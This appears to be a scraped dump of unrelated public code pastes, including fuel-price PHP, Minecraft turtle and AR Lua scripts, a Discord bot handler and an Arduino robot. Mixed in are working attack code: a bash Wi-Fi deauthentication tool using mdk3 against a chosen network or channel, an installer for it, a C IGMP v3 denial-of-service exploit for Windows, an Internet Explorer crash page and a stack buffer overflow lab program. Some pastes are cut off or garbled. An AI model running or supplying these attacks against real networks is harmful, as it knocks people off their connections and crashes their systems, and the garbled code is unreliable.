        $stmt_1 = $pdo->prepare($sql_1);
        $stmt_1->bindParam(':zeit1', $data['bm_lagerhaus_tankstelle']['zeit']);
        $stmt_1->bindParam(':tankstelle', $data['bm_lagerhaus_tankstelle']['tankstelle']);
        $stmt_1->bindParam(':adresse', $data['bm_lagerhaus_tankstelle']['adresse']);
        $stmt_1->bindParam(':preis', $data['bm_lagerhaus_tankstelle']['preis']);
        $stmt_1->bindParam(':treibstoff', $data['bm_lagerhaus_tankstelle']['treibstoff']);
        $stmt_1->execute();

        // Daten für liezen_jet_tankstelle einfügen
        $stmt_2 = $pdo->prepare($sql_2);
        $stmt_2->bindParam(':zeit', $data['liezen_jet_tankstelle']['zeit']);
        $stmt_2->bindParam(':tankstelle', $data['liezen_jet_tankstelle']['tankstelle']);
        $stmt_2->bindParam(':adresse', $data['liezen_jet_tankstelle']['adresse']);
        $stmt_2->bindParam(':preis', $data['liezen_jet_tankstelle']['preis']);
        $stmt_2->bindParam(':treibstoff', $data['liezen_jet_tankstelle']['treibstoff']);
        $stmt_2->execute();

        // Daten für trautenfels_shell_tankstelle einfügen
        $stmt_3 = $pdo->prepare($sql_3);
        $stmt_3->bindParam(':zeit', $data['trautenfels_shell_tankstelle']['zeit']);
        $stmt_3->bindParam(':tankstelle', $data['trautenfels_shell_tankstelle']['tankstelle']);
        $stmt_3->bindParam(':adresse', $data['trautenfels_shell_tankstelle']['adresse']);
        $stmt_3->bindParam(':preis', $data['trautenfels_shell_tankstelle']['preis']);
        $stmt_3->bindParam(':treibstoff', $data['trautenfels_shell_tankstelle']['treibstoff']);
        $stmt_3->execute();

        echo ""Daten erfolgreich in die Datenbank eingefügt."";
    } catch (PDOException $e) {
        die(""Fehler beim Einfügen der Daten: "" . $e->getMessage());
    }
}
?>
"
KyLpHfaf,vert_tunnel,yuzuchii,Lua,Saturday 22nd of July 2023 11:10:48 AM CDT,"start_y = 87

local modem = peripheral.wrap(""right"")
local event, side, channel, replyChannel, message, distance
local currentSlot = 0
modem.open(100)

while true do
    event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
    print((""command: %s""):format(message))

	if(message == 'forward') then
        turtle.forward()
    elseif(message == 'back') then
        turtle.back()
    elseif(message == 'left') then
        turtle.turnLeft()
    elseif(message == 'right') then
        turtle.turnRight()
 
    elseif(message == 'up') then
        turtle.up()
    elseif(message == 'down') then
        turtle.down()
 
    elseif(message == 'detect') then
		exist, data = turtle.inspect()
        msg = (""%s, %s""):format(exist ,data.name)
        modem.transmit(101, 100, msg)
 
    elseif(message == 'getSlot') then
        msg = (""item: %s x %s""):format(turtle.getItemDetail().name, turtle.getItemDetail().count)
        modem.transmit(101, 100, msg)
    elseif(message == 'nextSlot') then
        currentSlot = currentSlot + 1
		if( currentSlot > 16 ) then
			currentSlot = 1
        end
		turtle.select(currentSlot)
 
	elseif( message == ""place"") then
        turtle.place()
 
    elseif( message == ""getFuel"") then
        msg = (""detect: %s""):format(turtle.getFuelLevel())
        modem.transmit(101, 100, msg)
    elseif( message == ""refuel"") then
        turtle.refuel()
	end

    os.sleep(0.25)
end
                        "
AfXVm0ts,Untitled,Dorex,Linden Scripting,Saturday 22nd of July 2023 11:04:33 AM CDT,"integer limit = 20000; // <- bytes

Test()
{
    llSay(0, ""Limited Memory "" + (string)llGetMemoryLimit() +
              ""\nUsed Memory "" + (string)llGetUsedMemory() +
              ""\nFree Memory "" + (string)llGetFreeMemory());
}

default
{
    state_entry()
    {
        llSetMemoryLimit(limit);
        
        llScriptProfiler(PROFILE_SCRIPT_MEMORY);
        Test();
        llScriptProfiler(PROFILE_NONE);
        
        llSay(0,""This script used at most "" + (string)llGetSPMaxMemory() + "" bytes of memory during Test."");
    }
}"
m39w3Z0J,handleCommand.js,TinTz,JavaScript,Saturday 22nd of July 2023 10:36:19 AM CDT,"const { devs, testServer } = require('../../../config.json');
const getLocalCommands = require('../../utils/getLocalCommands');

const localCommands = [
  {
    name: 'giveaway',
    // Other properties...
    execute: async (client, interaction) => {
      // Main command logic here...
    },
    executeStart: async (client, interaction) => {
      // ""start"" subcommand logic here...
    },
    executePause: async (client, interaction) => {
      // ""pause"" subcommand logic here...
    },
    // Add other execute functions for other subcommands...
  },
  // Other command objects...
];

module.exports = async (client, interaction) => {
  if (!interaction.isCommand()) return;

  const localCommands = getLocalCommands();

  try {
    const commandObject = localCommands.find(
      (cmd) => cmd.name === interaction.commandName
    );

    console.log('Command object:', commandObject);

    if (!commandObject) return;

    if (commandObject.devOnly) {
      if (!devs.includes(interaction.member.id)) {
        interaction.reply({
          content: 'Only developers are allowed to run this command.',
          ephemeral: true,
        });
        return;
      }
    }

    if (commandObject.testOnly) {
      if (!(interaction.guild.id === testServer)) {
        interaction.reply({
          content: 'This command cannot be ran here.',
          ephemeral: true,
        });
        return;
      }
    }

    if (interaction.options.getSubcommand) {
      const subcommand = interaction.options.getSubcommand();
      // Handle the subcommand separately if needed
      switch (subcommand) {
        case 'start':
          if (typeof commandObject.executeStart !== 'function') {
            throw new Error('commandObject.executeStart is not a function');
          }
          await commandObject.executeStart(client, interaction);
          break;
        case 'pause':
          if (typeof commandObject.executePause !== 'function') {
            throw new Error('commandObject.executePause is not a function');
          }
          await commandObject.executePause(client, interaction);
          break;
        // Add cases for other subcommands...
        default:
          break;
      }
    } else {
      // If there are no subcommands, call the main execute function
      if (typeof commandObject.execute !== 'function') {
        throw new Error('commandObject.execute is not a function');
      }
      await commandObject.execute(client, interaction);
    }
  } catch (error) {
    console.log(`There was an error running this command: ${error}`);
  }
};
"
gK4Wv17c,turtle_remote,yuzuchii,Lua,Saturday 22nd of July 2023 10:24:38 AM CDT,"modem = peripheral.wrap('back')
modem.open(101)
 
local event, side, channel, replyChannel, message, distance, waitMsg
print(""START"")
 
while true do
    waitMsg = false
    local k_event, key, is_held = os.pullEvent(""key"")

    if( keys.getName(key) == 'up') then
        modem.transmit(100, 101, 'forward')
    elseif ( keys.getName(key) == 'down') then
        modem.transmit(100, 101, 'back')
    elseif ( keys.getName(key) == 'left') then
        modem.transmit(100, 101, 'left')
    elseif ( keys.getName(key) == 'right') then
        modem.transmit(100, 101, 'right')

    elseif ( keys.getName(key) == 'numPad8') then
        modem.transmit(100, 101, 'up')
    elseif ( keys.getName(key) == 'numPad2') then
        modem.transmit(100, 101, 'down')

    elseif( keys.getName(key) == 'numPad5') then
        modem.transmit(100, 101, ""detect"")
        waitMsg = true

    elseif( keys.getName(key) == ""numPad1"") then
        modem.transmit(100, 101, ""getSlot"")
        waitMsg = true
    elseif( keys.getName(key) == ""numPad3"") then
        modem.transmit(100, 101, ""nextSlot"")
    
	elseif( keys.getName(key) == ""numPad7"") then
        modem.transmit(100, 101, ""place"")

    elseif( keys.getName(key) == ""numPad0"") then
        modem.transmit(100, 101, ""getFuel"")
        waitMsg = true
    elseif( keys.getName(key) == ""numPadDecimal"") then
        modem.transmit(100, 101, ""refuel"")

	end

    if(waitMsg) then
		print(""waiting for message..."")
      	event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
      	print(('res: %s'):format(message))
	end

    os.sleep(0.25)
end"
utdhTSBZ,install.sh,FlyFar,Bash,Saturday 22nd of July 2023 10:23:28 AM CDT,"#!/bin/sh
apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6
echo ""deb http://http.kali.org/kali kali-rolling main contrib non-free"" >> /etc/apt/sources.list
echo ""deb http://repo.kali.org/kali kali-bleeding-edge main"" >> /etc/apt/sources.list
apt-get update  
apt-get install -y mdk3 macchanger
echo ""Done!"""
YJ0hm0vx,PwrDeauther.sh,FlyFar,Bash,Saturday 22nd of July 2023 10:22:26 AM CDT,"#!/bin/bash

# TERMINAL COLORS
# https://github.com/125K/terminal-colors
NO_COLOR=""\e[0m""
WHITE=""\e[0;17m""
BOLD_WHITE=""\e[1;37m""
BLACK=""\e[0;30m""
BLUE=""\e[0;34m""
BOLD_BLUE=""\e[1;34m""
GREEN=""\e[0;32m""
BOLD_GREEN=""\e[1;32m""
CYAN=""\e[0;36m""
BOLD_CYAN=""\e[1;36m""
RED=""\e[0;31m""
BOLD_RED=""\e[1;31m""
PURPLE=""\e[0;35m""
BOLD_PURPLE=""\e[1;35m""
BROWN=""\e[0;33m""
BOLD_YELLOW=""\e[1;33m""
GRAY=""\e[0;37m""
BOLD_GRAY=""\e[1;30m""
# END OF TERMINAL COLORS

function coolexit()
{
	clear
	sleep 2
	ifconfig $WI down
	macchanger -p $WI
	iwconfig $WI mode managed
	ifconfig $WI up
	clear
	title
	echo -e $BOLD_RED
	echo "" Thanks for using this script""
	echo -e "" My GitHub:$BOLD_WHITE https://github.com/125K""
	exit
}

function title() {
	echo -e $BOLD_GREEN
	echo ""     ____                ____	                __  __	     ""
	echo ""    / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____""
	echo ""   / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/""
	echo ""  / ____/| |/ |/ / /  / /_/ /  __/ /_/ / /_/ / /_/ / / /  __/ /    ""
	echo "" /_/     |__/|__/_/  /_____/\\___/\\__,_/\\__,_/\\__/_/ /_/\\___/_/     ""
	echo -e $BOLD_WHITE
	echo ""				Automatic MDK3 deauther by 125K""
}

function getIFCARD() {
        echo -e ""$BOLD_GREEN   Your interfaces: ""
        echo -e -n ""$BOLD_WHITE""
        ifconfig | grep -e "": "" | sed -e 's/: .*//g' | sed -e 's/^/   /'
        echo "" ""
        echo -n -e ""$BOLD_CYAN   Type your wireless interface > ""
        echo -n -e ""$BOLD_WHITE""
}

function changeMAC() {
        ifconfig $WI down
        iwconfig $WI mode monitor
        macchanger -r $WI
        ifconfig $WI up
}

title
echo -e $BOLD_CYAN
echo "" Choose an option:""
echo "" ""
echo -e ""$BOLD_BLUE 1.$BOLD_WHITE Deauth a specific BSSID""
echo -e ""$BOLD_BLUE 2.$BOLD_WHITE Deauth a whole channel""
echo "" ""
echo -n -e ""$BOLD_WHITE > ""
read CHOICE
clear

if [ $CHOICE == 1 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo "" ""
	echo -e -n $BOLD_CYAN
	echo -n "" Type the target BSSID > ""
	echo -e -n $BOLD_WHITE
	read BSSID
	clear
	title
	echo "" ""
	getIFCARD
	read WI
	echo "" ""
	echo -e $BOLD_GREEN
	echo ""Starting the attack... Press CTRL+C to stop the attack.""
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -t ""$BSSID""
elif [ $CHOICE == 2 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo "" ""
	echo -e -n $BOLD_CYAN
	echo -n "" Type the target channel > ""
	echo -e -n $BOLD_WHITE
	read CH
	clear
	title
	echo "" ""
	getIFCARD
	read WI
	echo "" ""
 	echo -e $BOLD_GREEN
	echo -e ""Starting the attack... Press CTRL+C to stop the attack.""
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -c $CH
else
	echo -e $BOLD_RED Invalid option
	sleep 3
	coolexit
fi"
in2YzY8v,Extract-JSON-From_HTML,SimeonMihaylov,C#,Saturday 22nd of July 2023 10:21:26 AM CDT,"using System;
using HtmlAgilityPack;

class Program
{
    static void Main()
    {
        // Слагаш кода в променлива
        string htmlCode = @""ТУРИ HTML КОДА ТУКА""

        // правиш инстанция на клас HtmlDocument(), който получаваш от HtmlAgilityPack, импортнат по-горе
        HtmlDocument doc = new HtmlDocument();
        // казваш му, че искаш да ти го зареди като HtmlDocument()
        doc.LoadHtml(htmlCode);

        /*
        тук в този foreach loop HtmlNode е 1 елемент от колекцията HtmlNodeCollection, която получаваш
        от SelectNodes метода. item е променлива, която ще репрезентира всеки един div, който искаш
        да избереш от HTML-a и използваш SelectSingleNode за да избереш точно този елемент
        */
        foreach (HtmlNode item in doc.DocumentNode.SelectNodes(""//div[@class='item']""))
        {
            // Вадиш имената на продуктите (InnerText се използва, за да вземеш САМО текста, който се намира в тага, без <span><h1> и подобни)
            string productName = item.SelectSingleNode("".//h4/a"").InnerText;

            // Вадиш цената на продуктите (InnerText се използва, за да вземеш САМО текста, който се намира в тага, без <span><h1> и подобни)
            string price = item.SelectSingleNode("".//p[@class='price']//span[contains(@class,'dollars')]"").InnerText;

            // от цената, която си взел по-горе, ПРЕМАХВАШ знака за валута и го заместваш с нищо ("""")
            // след това парсваш цената към десетична дроб (със знака е стринг, идеята е да е Decimal)
            price = price.Replace(""$"", """");
            decimal decimalPrice = decimal.Parse(price);

            // тук подобно на горното, разделяш думата ""rating"" от числото ""0"", защото ти трябва Double, а с ""rating"" е String
            // отново го парсваш към въпросната желана единица, в случая Double и така имаш рейтинга като число
            string rawRating = item.GetAttributeValue(""rating"", ""0"");
            double rating = double.Parse(rawRating);

            // тук трябва да се погрижиш рейтинга да е ДО 100 АКО е по-малък или равен на 5
            if (rating <= 5.0)
            {
                rating = rating / 5.0 * 100.0;
            }

            Console.WriteLine(""Product Name: "" + productName);
            Console.WriteLine(""Price: "" + decimalPrice);
            Console.WriteLine(""Rating: "" + rating);
            Console.WriteLine();
        }
    }
}
"
ZFqVVWkg,Buffer Overflow - The Byzantine Attack,FlyFar,C,Saturday 22nd of July 2023 10:17:47 AM CDT,"#include
#include
#include

/* Like gets, except that characters */
/* are typed as pairs of hex digits. */
/* Nondigit characters are ignored. */
/* Stops when encounters newline */

char *getxs(char *dest)
{
int c;
int even = 1; /* Have read even number of digits */
int otherd = 0; /* Other hex digit of pair */
char *sp = dest;
while ((c = getchar()) != EOF && c != '\n') {
if (isxdigit(c)) {
int val;
if ('0' <= c && c <= '9')
val = c - '0';
else if ('A' <= c && c <= 'F')
val = c - 'A' 10;
else
val = c - 'a' 10;
if (even) {
otherd = val;
even = 0;
} else {
*sp = otherd * 16 val;
even = 1;
}
}
}
*sp = '\0';
return dest;
}

/* $begin getbuf-c */
int getbuf()
{
char buf[12];
getxs(buf);
return 1;
}

void test()
{
int val;
printf('Type Hex string:');
val = getbuf();
printf('getbuf returned 0x%x\n', val);
}
/* $end getbuf-c */

int main()
{

int buf[16];
/* This little hack is an attempt */
/* to get the stack to be in a */
/* stable position */

int offset = (((int) buf) & 0xFFF);
int *space = (int *) alloca(offset);

*space = 0; /* So th"""
cp7URzJx,Untitled,rvinter,Kotlin,Saturday 22nd of July 2023 10:14:51 AM CDT,"import androidx.compose.foundation.layout.BoxWithConstraints
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.runtime.Composable
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.unit.TextUnit
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

@Composable
fun FlexibleTextInput() {
    BoxWithConstraints(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp),
    ) {
        val areaWidth = constraints.maxWidth
        val minTextSize = 32.sp

        var text by rememberSaveable { mutableStateOf("""") }

        fun calculateTextSize(): TextUnit {
            val charsCount = if (text.isNotEmpty()) text.length else 1
            val maxCharSize = (areaWidth / charsCount).sp

            return if (maxCharSize < minTextSize) minTextSize else maxCharSize
        }

        BasicTextField(
            value = text,
            onValueChange = {
                text = it
            },
            textStyle = TextStyle(
                color = Color.White,
                fontSize = calculateTextSize()
            )
        )
    }
}"
LkXyuZJ4,Internet Explorer CSS DoS Exploit - a CSS table that crashes a remote user's browser,FlyFar,HTML,Saturday 22nd of July 2023 10:14:21 AM CDT,"<!-- Because I am so enamored by browser flaws (for some unknown reason) I have added an exploit I found on the web, that shows how to create a CSS table that crashes a remote user's browser. IE suffers from a DoS vulnerability in which a remote user's Internet Explorer session can be crashed when hovering their cursor over a specially made table. The fault occurs when the ""position"" CSS attribute is set to a table cell. This results in an 'unhandled exception in iexplorer.exe(MSHTML.DLL)'. This fault is found in Internet Explorer version 6.0.2900 SP2 and prior -->
<html>
<head>
</style>
<meta http-equiv=""Content-Type"" content=""text/html; charset=windows-1252"">

<title>IE-Crash< / title>
<style type=""text/css"">

#header{

position: fixed;
height: 761px;
width: 1268;
}
</style>
</head>
<body>
<table border=""2"" cellpadding=""0"" cellspacing=""0"" width=""797"" height=""343"" align=""center"">

 <tr>
    
  <td id=""header"" valign=""top"">


          </td>
<td valign=""top"">

         </td>
</table>"
BTnZYVhu,IGMP v3.0 DoS Exploit - The Byzantine Attack,FlyFar,C,Saturday 22nd of July 2023 10:09:43 AM CDT,"/*
IGMP v3 DoS Exploit

ref: http://www.juniper.net/security/auto/vulnerabilities/vuln2866.html
ref: http://www.microsoft.com/technet/security/Bulletin/MS06-007.mspx

by Alexey Sintsov (dookie@inbox.ru)

Req:
Administrator rights on system
Windows Firewall off (for sending RAW packets)

Affected Products:
Microsoft Corporation Windows XP All
Microsoft Corporation Windows Server 2003 All
*/


#include <stdio.h>
#include <sys/socket.h>

typedef struct iphdr
{
unsigned char verlen; // IP version & length
unsigned char tos; // Type of service
unsigned short total_len; // Total length of the packet
unsigned short ident; // Unique identifier
unsigned short frag_and_flags; // Flags
unsigned char ttl; // Time to live
unsigned char proto; // Protocol (TCP, UDP etc)
unsigned short checksum; // IP checksum
unsigned int sourceIP; // Source IP
unsigned int destIP; // Destination IP
unsigned short options[2];

} IPHEADER;

typedef struct igmphdr {
unsigned char type;
unsigned char code;
unsigned short checksum;
unsigned long group;
unsigned char ResvSQVR;
unsigned char QQIC;
unsigned short num;
unsigned long addes;

} IGMPHEADER;

USHORT checksum(USHORT *buffer, int size)
{
unsigned long cksum=0;

while (size > 1) {
cksum += *buffer++;
size -= sizeof(USHORT);
}

if (size)
cksum += *(UCHAR*)buffer;

cksum = (cksum >> 16) + (cksum & 0xffff);
cksum += (cksum >>16);

return (USHORT)(~cksum);
}

int sendIGMP(char* a, char* b)
{
unsigned int dst_addr, src_addr;

IPHEADER ipHeader;
IGMPHEADER igmpHeader;
dst_addr=inet_addr (b);
src_addr=inet_addr (a);

char szSendBuf[60]={0};
int rect;

SOCKET sock;

BOOL flag=TRUE;
if (setsockopt(sock,IPPROTO_IP,2,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
printf(""Set options error"");
closesocket(sock);
WSACleanup();
return FALSE;
}

SOCKADDR_IN ssin;
memset(&ssin, 0, sizeof(ssin));
ssin.sin_family=AF_INET;
ssin.sin_port=htons(99);
ssin.sin_addr.s_addr=dst_addr;

ipHeader.verlen=(4<<4 sizeof(ipHeader)/sizeof(unsigned long));
ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(igmpHeader));

ipHeader.ident=htons(0);

ipHeader.frag_and_flags=0;

ipHeader.ttl=128;
ipHeader.proto=IPPROTO_IGMP;

ipHeader.checksum=0;

ipHeader.tos=0;

ipHeader.destIP=dst_addr;
ipHeader.sourceIP=src_addr;

//Ip options
ipHeader.options[0]=htons(0x0000); //bug is here =)
ipHeader.options[1]=htons(0x0000);

igmpHeader.type=0x11; //v3 Membership Query
igmpHeader.code=5;
igmpHeader.num=htons(1);
igmpHeader.ResvSQVR=0x0;
igmpHeader.QQIC=0;
igmpHeader.group=inet_addr(""0.0.0.0"");
igmpHeader.addes=dst_addr;

igmpHeader.checksum=0;

memcpy(szSendBuf, &igmpHeader, sizeof(igmpHeader));

igmpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(igmpHeader));

memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
memcpy(szSendBuf+sizeof(ipHeader), &igmpHeader, sizeof(igmpHeader));
memset(szSendBuf+sizeof(ipHeader)+sizeof(igmpHeader), 0, 4);

ipHeader.checksum=ntohs(checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(igmpHeader)));

memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));

rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(igmpHeader),0,(LPSOCKADDR)&ssin, sizeof(ssin));

if (rect==SOCKET_ERROR) {
printf(""Send error: <%d>\n"",WSAGetLastError());
closesocket(sock);
return 0;
}

closesocket(sock);


return 1;
}

main(int argc, char **argv)
{
if(argc<2)
{
printf(""\nIGMP v3 DoS Exploit (MS06-007) by Alexey Sintsov(dookie@inbox.ru)\n\n"");
printf(""Usage:\n"");
printf(""c:\\igmps.exe <target ip> <source ip>\n\n"");
exit(0);
}

sendIGMP(argv[2], argv[1]);
return 0;
}"
TN0MndY5,Untitled,dllbridge,ASM (NASM),Saturday 22nd of July 2023 09:52:34 AM CDT,"
 
format  PE console
entry   start
include 'win32ax.inc'
include 'api\kernel32.inc'
 
 
 
;------------------------------------------------             Создание переменных:
section '.data' data readable writeable
 
 
           n     dd  99  ; Переменная n (4 байта)
 
    sz_Hello     db  'Hello world ! n = %d', 10, 10, 0
;------------------------------------------------                   Код программы:
section '.code' code readable executable
 
 
 start:    push [n]

           push sz_Hello

           call [printf]

           mov eax, 15
 
           add eax, [n]
 
           cmp eax, 100
           jz  L_03             ; Если eax == 100
           jg  L_02             ; Если eax  > 100
 
           cinvoke  printf, <""eax = %3d < 100"", 10, 0>, eax
           jmp L_04
 L_02:     cinvoke  printf, <""eax = %3d > 100"", 10, 0>, eax
           jmp L_04
 L_03:     cinvoke  printf, <""eax = %3d = 100"", 10, 0>, eax
 
 L_04:     cinvoke  scanf, <""%d"", 10, 0>, n
           invoke   ExitProcess, 0
 
 
 
;------------------------------------------------           Подключение библиотек:
section '.idata' import data readable
library kernel32, 'kernel32.dll',\
        msvcrt,   'msvcrt.dll'
 
import msvcrt,\
       printf, 'printf',\
       scanf,  'scanf'
 


                    "
QdHvsyua,r/place ton template,Kittenji,JSON,Saturday 22nd of July 2023 09:49:41 AM CDT,"{
  ""contact"": """",
  ""notifications"": """",
  ""templates"": [
    {
      ""name"": ""Bus"",
      ""sources"": [
        ""https://i.imgur.com/kfEsYXs.png""
      ],
      ""x"": 281,
      ""y"": 872
    }
  ],
  ""whitelist"": [],
  ""blacklist"": []
}
"
95yCxjSA,ar,ZJSSON,Lua,Saturday 22nd of July 2023 09:43:54 AM CDT,"local m=peripheral.find('meBridge')
local a=peripheral.find('arController')

local lastItems={}
local lastFluids={}

local TIME=3

a.setRelativeMode(true, 1600, 900) -- Convenient Aspect ratio for most screens
while true do
    sleep(TIME)
    a.clear()
    local new={}

    local x=20
    a.drawString(""Crafting Jobs:"",1,20,0x0000ff)
    for key,value in pairs(m.listItems()) do
        if value.name~=nil then
            new[value.name]=value.amount
            local tf,y=m.isItemCrafting({name=value.name})
            if tf then
                a.drawItemIcon(value.name,x,20)
                x=x+20
            end
        end
    end

    -- for key,value in pairs(lastItems) do
    --     if new[key]==nil then
    --         new[key]=0
    --     end
    -- end

    if next(lastItems)~=nil then
        local y=50
        for key,value in pairs(new) do
            local v=0

            if lastItems[key]==nil then
                v=0
            else
                v=lastItems[key]
            end

            
            if value>v then
                -- print(key.."" ""..v.."" ""..value)
                a.drawItemIcon(key,20,y)
                a.drawString(""+""..(value-v)..""=""..value,50,y+8,0x00ff00)
                y=y+32
            elseif value<v then
                -- print(key.."" ""..v.."" ""..value)
                a.drawItemIcon(key,20,y)
                a.drawString(""""..(value-v)..""=""..value,50,y+8,0xff0000)
                y=y+32
            end
        end
    end

    lastItems=new
end
"
1ipPu2fm,ar,ZJSSON,Lua,Saturday 22nd of July 2023 09:43:25 AM CDT,"local m=peripheral.find('meBridge')
local a=peripheral.find('arController')

local lastItems={}
local lastFluids={}

controller.setRelativeMode(true, 1600, 900) -- Convenient Aspect ratio for most screens
while true do
    sleep(1)
    local new={}
    for key,value in pairs(m.listItems()) do
        new[m.name]=m.amount
    end

    if next(lastItems)~=nil then
        local y=20
        for key,value in pairs(new) do
            if value>lastItems[key] then
                a.drawItemIcon(key,20,y)
                a.drawString(""+""..(value-lastItems[key]),50,y,5)
                y+=32
            elseif value<lastItems[key] then
                a.drawItemIcon(key,20,y)
                a.drawString((value-lastItems[key]),50,y,1)
                y+=32
            end
        end
    end

    lastItems=new
end
"
qgSFWgAJ,International phone number check,SteveGarman,JavaScript,Saturday 22nd of July 2023 09:38:47 AM CDT,"function OnStart()
{
   // test harness for create_phReg
   lay = app.CreateLayout(""linear"", ""VCenter, FillXY"")
   btn = app.AddButton(lay, ""Test"")
   btn.SetOnTouch(btn_OnTouch)
   txt = app.AddTextEdit( lay, ""+441234 1234 56"" )
   app.AddLayout(lay)
   // make sure we have phone number details
   create_phReg()
}
function btn_OnTouch( )
{
   phon = validatePhoneNumber(txt.GetText())
   alert(JSON.stringify(phon,null,1))
}
////////////////////
function create_phReg( )
{
  var test  = 
  app.LoadText( ""knownCountries"",""none"",app.GetAppName())
  alert(test)
  if(test == ""none"")
  {
   phReg = [ ]
   phReg.push({""c"": ""+1"",""a"": ""North America""})
   phReg.push({""c"": ""+441481"",""a"":""Guernsey""})
   phReg.push({""c"": ""+441534"",""a"":""Jersey""})
   phReg.push({""c"": ""+441624"",""a"":""Isle lf Man""})
   phReg.push({""c"": ""+44"",""a"": ""UK""})
   phReg.push({""c"": ""+52"",""a"": ""Mexico""})
   phReg.push({""c"": ""+86"",""a"": ""China""})
   phReg.push({""c"": ""+91"",""a"": ""UK""})
   app.SaveText( ""knownCountries"",JSON.stringify(phReg),app.GetAppName() )
   }
   else phReg = JSON.parse( test )
   // now we have known numbers
   //alert(""display known\n""+JSON.stringify(phReg))
   return( phReg )
}  // create_phReg ends

// validatePhoneNumber
function validatePhoneNumber(phoneNumber) {
  // Remove all space characters from the input data
  const inp = phoneNumber.replace(/\s/g, '');

  // Regular expression to validate the international phone number format
  const phoneNumberRegex = /^\+(?:[0-9] ?){6,14}[0-9]$/;
  const isValidPhoneNumber = phoneNumberRegex.test(inp);

  let valid = isValidPhoneNumber;
  let code = null;
  let number = null;
  let country_name = null;
  if (isValidPhoneNumber) {
    // Extract the country code and local number
    code = inp.slice(1, inp.length - 10);
    number = inp.slice(inp.length - 10);
    for(var item in phReg) {
      if(inp.startsWith(phReg[item].c)) {
         country_name = phReg[item].a
         alert(""found "" + phReg[item].a)
         break
      }
   }
  }
  return [phoneNumber,valid, code, number, country_name];
} // validatePhoneNumber ends"
8rrDzxhb,tank robot,STANAANDREY,C++,Saturday 22nd of July 2023 09:29:32 AM CDT,"
//typedef unsigned char uchar

struct {
  char get() {
    char ch = 0;
    if(Serial.available()) {
      ch = Serial.read();
    }
    return ch;
  }
} bluetooth;

struct Mover{
  static const int MIN_POW = 250;
  static const int LEFT_DIR_PIN = 2;
  static const int LEFT_POWER_PIN = 5;
  static const int RIGHT_DIR_PIN = 4;
  static const int RIGHT_POWER_PIN = 6; 
  void init() {
    //right
    pinMode(RIGHT_DIR_PIN, OUTPUT);
    pinMode(RIGHT_POWER_PIN, OUTPUT);
    analogWrite(RIGHT_POWER_PIN, 0);
    //left
    pinMode(LEFT_DIR_PIN, OUTPUT);
    pinMode(LEFT_POWER_PIN, OUTPUT);
    analogWrite(LEFT_POWER_PIN, 0);
  }
  void rotateRight() {
    digitalWrite(RIGHT_DIR_PIN, LOW);
    analogWrite(RIGHT_POWER_PIN, MIN_POW);
  }
  void rotateLeft() {
    digitalWrite(LEFT_DIR_PIN, HIGH);
    analogWrite(LEFT_POWER_PIN, MIN_POW);
  }
  void moveForward() {
    digitalWrite(RIGHT_DIR_PIN, HIGH);
    digitalWrite(LEFT_DIR_PIN, LOW);
    analogWrite(RIGHT_POWER_PIN, MIN_POW);
    analogWrite(LEFT_POWER_PIN, MIN_POW);
  }
  void moveBack() {
    digitalWrite(RIGHT_DIR_PIN, LOW);
    digitalWrite(LEFT_DIR_PIN, HIGH);
    analogWrite(RIGHT_POWER_PIN, MIN_POW);
    analogWrite(LEFT_POWER_PIN, MIN_POW);
  }
  void stop() {
    analogWrite(RIGHT_POWER_PIN, 0);
    analogWrite(LEFT_POWER_PIN, 0);
  }
};

struct Driver {
  Mover mover;
  Driver() {
    mover.init();
  }
  
  void drive(char ch) {
    switch(ch) {
      case 'l':
        mover.rotateLeft();
        break;
      case 'r':
        mover.rotateRight();
        break;
      case 'f':
        mover.moveForward();
        break;
      case 'b':
        mover.moveBack();
        break;
      case 's':
        mover.stop();
        break;
      default:
        break;
    }
  }
} driver;

void setup() {
  Serial.begin(9600);
}

void loop() {
  char ch;
  if (ch = bluetooth.get()) {
    Serial.println(ch);
  }
  driver.drive(ch);//*/
}"
bbSb2hV0,glases,mrWhiskasss,Lua,Saturday 22nd of July 2023 09:25:42 AM CDT,"local component = require(""component"")
local fs = require(""filesystem"")
local computer = require(""computer"")
--local chatOnGlassesLib = require(""ChatOnGlassesLib"")
local gpu = component.gpu

local items = {
    {id = ""dwcity:Vis_materia"", dmg = 0},
    {id = ""customnpcs:npcMoney"", dmg = 0}
}
local players = {
    { name = ""Krobys"", isJoin = true, isHideOnline = true},
    { name = ""OSSO"", isJoin = false, isHideOnline = false},
    { name = ""PREVESHE"", isJoin = false, isHideOnline = false}
}
local peripherals = {
    chat_box = nill,
    me_interface = nill,
    sensor = nill,
    bridge = component.openperipheral_bridge or error(""No openperipheral_bridge available"")
}
local settings = {
    tps = true,
    me_items = true,
    sensor_players = true,
    player_items = true,
    chat_box = true,
    local_chat = true,
    memory_monitoring = true,
    admin = ""Krobys"",
    chat_box_name = ""§8[§4Алиса§8]""
}
defaultSlotValue = 18
local constraints = {
    leftBorderAbsolute = defaultSlotValue / 2,
    topBorderAbsolute = defaultSlotValue / 2,

    timeTextWidth = defaultSlotValue * 5,
    --timeValueWidth = defaultSlotValue * 5,--not using now

    nickname_width = defaultSlotValue * 4,
